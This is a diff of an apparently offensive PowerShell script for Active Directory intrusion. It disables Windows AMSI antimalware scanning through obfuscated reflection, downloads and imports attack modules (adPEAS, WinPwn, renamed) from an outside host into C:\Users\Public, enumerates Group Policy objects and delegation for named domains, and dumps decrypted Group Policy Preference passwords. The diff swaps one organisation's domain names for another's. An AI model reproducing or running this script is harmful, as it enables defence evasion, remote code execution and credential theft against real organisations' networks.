@@ -42,7 +42,7 @@ $object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'m
 $Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
 
-$url = "https://attck.community/AD/adPEAS.ps1"
+$url = "https://attck.community/attck/ad/AppleDogPeas.ps1"
 $tempFilePath = "C:\Users\Public\pea.ps1"
 Invoke-WebRequest $url -OutFile $tempFilePath 
 Import-Module $tempFilePath 
@@ -50,7 +50,7 @@ Remove-Item $tempFilePath
 
 
 
-$url = "https://attck.community/AD/WinPwn/WinPwn.ps1"
+$url = "https://attck.community/attck/ad/WonTonPlatypus.ps1.ps1"
 $tempFilePath = "C:\Users\Public\powen.ps1"
 Invoke-WebRequest $url -OutFile $tempFilePath 
 Import-Module $tempFilePath 
@@ -58,8 +58,8 @@ Remove-Item $tempFilePath
 
 Get-NetGPO | Select-String displayname,distinguishedname,objectguid | fl > netgp.txt
 Invoke-GPUpdate
-Get-GPInheritance -Target "OU=Service Accounts,OU=Reyes Holdings Enterprise,DC=reyesholdings,DC=com"  > C:\Users\Public\out\gp.txt
-Get-GPInheritance -Target "OU=T0-Service Accounts,OU=Tier 0,OU=Admin-T,DC=reyesholdings,DC=com" >> C:\Users\Public\out\gp.txt
-Get-GPODelegation -Target "OU=Service Accounts,OU=Reyes Holdings Enterprise,DC=reyesholdings,DC=com" >> C:\Users\Public\out\gp.txt
-Get-GPODelegation -Target "OU=T0-Service Accounts,OU=Tier 0,OU=Admin-T,DC=reyesholdings,DC=com" >> C:\Users\Public\out\gp.txt
+Get-GPInheritance -Target "OU=Service Accounts,OU=C3S Community,DC=c3s,DC=community"  > C:\Users\Public\out\gp.txt
+Get-GPInheritance -Target "OU=T0-Service Accounts,OU=Tier 0,OU=Admin-T,DC=c3s,DC=community" >> C:\Users\Public\out\gp.txt
+Get-GPODelegation -Target "OU=Service Accounts,OU=C3S Community,DC=c3s,DC=community" >> C:\Users\Public\out\gp.txt
+Get-GPODelegation -Target "OU=T0-Service Accounts,OU=Tier 0,OU=Admin-T,DC=c3s,DC=community" >> C:\Users\Public\out\gp.txt
 Get-GPPDecryptedCpassword > C:\Users\Public\out\gpdpass.txt
